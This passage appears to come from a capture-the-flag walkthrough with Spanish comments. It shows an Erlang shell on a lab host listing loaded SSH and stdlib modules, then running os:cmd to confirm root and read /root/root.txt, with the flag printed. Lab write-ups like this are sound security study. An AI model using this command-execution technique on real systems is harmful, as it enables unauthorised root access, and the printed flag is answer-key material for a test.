ssh_app               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_app.beam
ssh_auth              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_auth.beam
ssh_bits              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_bits.beam
ssh_channel_sup       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_channel_sup.beam
ssh_cli               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_cli.beam
ssh_client_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_client_channel.beam
ssh_connection        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection.beam
ssh_connection_handl  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_handler.beam
ssh_connection_sup    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_sup.beam
ssh_dbg               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_dbg.beam
ssh_file              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_file.beam
ssh_fsm_kexinit       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_kexinit.beam
ssh_fsm_userauth_ser  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_userauth_server.beam
ssh_lib               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_lib.beam
ssh_message           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_message.beam
ssh_options           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_options.beam
ssh_server_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_server_channel.beam
ssh_sftpd             /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_sftpd.beam
ssh_system_sup        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_system_sup.beam
ssh_tcpip_forward_ac  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_tcpip_forward_acceptor_sup.beam
ssh_transport         /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_transport.beam
standard_error        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/standard_error.beam
start_escript__escri  /usr/local/lib/erlang_login/start.escript
string                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/string.beam
supervisor            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor.beam
supervisor_bridge     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor_bridge.beam
sys_core_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_alias.beam
sys_core_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_bsm.beam
sys_core_fold         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_fold.beam
unicode               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode.beam
unicode_util          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode_util.beam
user_drv              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_drv.beam
user_sup              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_sup.beam
v3_core               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/v3_core.beam
zlib                  preloaded
ok
(ssh_runner@soulmate)3> os:cmd("id").
# vemos que estamos en contexto root
"uid=0(root) gid=0(root) groups=0(root)\n"
# obtenemos el flag
(ssh_runner@soulmate)4> os:cmd("cat /root/root.txt").
"491ffa7595e4818ff575bad4044870bd\n"
(ssh_runner@soulmate)5> 
```
